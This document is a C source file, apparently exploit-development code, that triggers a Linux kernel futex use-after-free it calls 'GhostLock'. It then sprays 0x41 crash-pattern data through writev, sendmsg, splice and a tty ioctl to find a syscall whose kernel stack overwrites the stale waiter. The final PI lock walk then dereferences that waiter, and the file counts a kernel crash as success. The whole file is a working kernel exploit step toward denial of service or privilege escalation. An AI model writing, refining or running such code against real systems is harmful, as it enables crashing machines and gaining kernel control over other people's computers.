/**
 * ghostlock64_bruteforce.c — Brute-force find post-GhostLock syscall
 * that naturally overwrites stale waiter on kernel stack.
 *
 * Strategy: After GhostLock creates UAF waiter, try different syscalls
 * (sendmsg, writev, splice) with crash-pattern data. If the syscall's
 * stack frames overlap with the stale waiter, the crash pattern ends up
 * in waiter->task. Subsequent PI trigger dereferences it → KERNEL CRASH.
 *
 * ⚠️ KERNEL CRASH = SUCCESS! (means we found overlapping stack depth)
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

/* Crash pattern: if kernel dereferences this as task_struct → OOPS */
static const uint64_t CRASH = 0x4141414141414141ULL;

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] GhostLock: ret=%ld errno=%d\n", r, errno);

    /* ── Test approach: writev with crash pattern to pipe ── */
    printf("[test] Approach 1: writev large to pipe\n");
    {
        int pp[2]; pipe(pp);
        /* Fill pipe buffer to force deep kernel path */
        fcntl(pp[1], F_SETPIPE_SZ, 65536);  /* 16 pages */

        /* Prepare crash-pattern data */
        char buf[65536];
        memset(buf, 0x41, sizeof(buf));
        struct iovec iov = {buf, sizeof(buf)};

        /* writev: deep kernel path that copies user data to pipe buffers */
        ssize_t n = writev(pp[1], &iov, 1);
        printf("[test]   writev(64K): ret=%zd errno=%d\n", n, errno);
        close(pp[0]); close(pp[1]);
    }

    /* ── Test: sendmsg to socketpair ── */
    printf("[test] Approach 2: sendmsg large to socket\n");
    {
        int sv[2];
        socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
        /* Make socket buffer large */
        int sndbuf = 262144;
        setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

        char buf[65536];
        memset(buf, 0x41, sizeof(buf));
        struct iovec iov = {buf, sizeof(buf)};
        struct msghdr msg = {0};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        ssize_t n = sendmsg(sv[0], &msg, 0);
        printf("[test]   sendmsg(64K): ret=%zd errno=%d\n", n, errno);
        close(sv[0]); close(sv[1]);
    }

    /* ── Test: splice large data ── */
    printf("[test] Approach 3: splice large\n");
    {
        int pp[2]; pipe(pp);
        int pp2[2]; pipe(pp2);
        fcntl(pp[1], F_SETPIPE_SZ, 65536);
        fcntl(pp2[0], F_SETPIPE_SZ, 65536);

        /* Write crash data to pp */
        char buf[65536];
        memset(buf, 0x41, sizeof(buf));
        write(pp[1], buf, sizeof(buf));

        /* splice: deep kernel path */
        ssize_t n = splice(pp[0], NULL, pp2[1], NULL, 65536, 0);
        printf("[test]   splice(64K): ret=%zd errno=%d\n", n, errno);
        close(pp[0]); close(pp[1]);
        close(pp2[0]); close(pp2[1]);
    }

    /* ── Test: ioctl with deep handler ── */
    printf("[test] Approach 4: ioctl on tty\n");
    {
        int fd = open("/dev/tty", O_RDWR);
        if (fd >= 0) {
            char buf[256];
            memset(buf, 0x41, sizeof(buf));
            r = ioctl(fd, TCGETS, buf);  /* tcgetattr: copies data to kernel stack */
            printf("[test]   ioctl(TCGETS): ret=%d errno=%d\n", (int)r, errno);
            close(fd);
        } else {
            printf("[test]   /dev/tty not available\n");
        }
    }

    /* ── PI trigger to test if crash pattern reached waiter ── */
    printf("[test] Triggering PI walk...\n");
    {
        uint32_t pi_futex __attribute__((aligned(4096))) = 0;
        struct timespec t = {.tv_sec = 1};
        r = futex(&pi_futex, FUTEX_LOCK_PI, 0, &t, NULL, 0);
        printf("[test] PI trigger: ret=%ld errno=%d\n", r, errno);
        if (r == 0) futex(&pi_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }

    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    while (!done) sleep(1);
    return 0;
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  GhostLock + Syscall Brute Force    ║\n");
    printf("║  ⚠️  KERNEL CRASH = OVERLAP FOUND! ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED (no overlap via these syscalls) ===\n");
    return 0;
}
